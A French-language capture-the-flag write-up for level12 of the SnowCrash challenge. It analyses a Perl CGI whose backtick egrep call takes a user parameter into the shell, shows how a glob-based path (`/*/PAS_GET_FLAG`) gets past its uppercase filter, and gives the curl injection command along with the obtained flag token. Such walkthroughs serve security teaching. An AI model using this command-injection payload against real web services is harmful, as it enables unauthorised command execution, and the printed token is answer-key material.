#level12

1) un simple `ls` permet de trouver un fichier perl nomme `level12.pl`. Lorsque on l'execute il affiche ceci:

```
Content-type: text/html

..
```

2) si on li le code perl cela donne ca:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

en resume ce programe perl : 

 - prend le premier argument `x` sur le port `4646`
 - Uppercase `x`
 - Retire tous apres le premier mots
 - recherche dans `/tmp/xd` pour une ligne contenant `x`
 - separe toute les lignes trouvees par `:`
 - compare chaque champ trouve avec `y`
 - Retourne 1 si ca match `y`
 - sinon retourne 0
 - enfin la fonction affiche soit : `.` si y a match, soit `..` si cela na pas match

et le plus beau dans tout ca c'est que tout ce si ne sert a rien...

3) En effet il y a une vulnerabilte shell comme pour le `level04` sur la ligne:

```
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

en effet cette ligne vas executer ce qu'on lui donne en argument en shell. On peut donc detourner le CGI pour qu'il execute `getflag` a notre place

4) Cependant il y a un garde fou, l'argument que l'on envoie sur le serveur va etre uppercase par `$xx =~ tr/a-z/A-Z/;`. On ne peut donc pas directement envoyer `$(getflag)`

5) la solution que nous avons trouve est de creer un petit script bash avec un nom en UPPER_CASE qui va executer `getflag` : 

```sh
#!/bin/sh

getflag > /tmp/flag12
```

ensuite il ne reste plus qu'a faire en sorte que le serveur trouve et execute notre script : 

```sh
level12@SnowCrash:~$ echo "getflag > /tmp/flag.txt" > /tmp/PAS_GET_FLAG
level12@SnowCrash:~$ chmod 777 /tmp/PAS_GET_FLAG
level12@SnowCrash:~$ curl "http://localhost:4646/?x=\`\/*\/PAS_GET_FLAG\`"
..level12@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
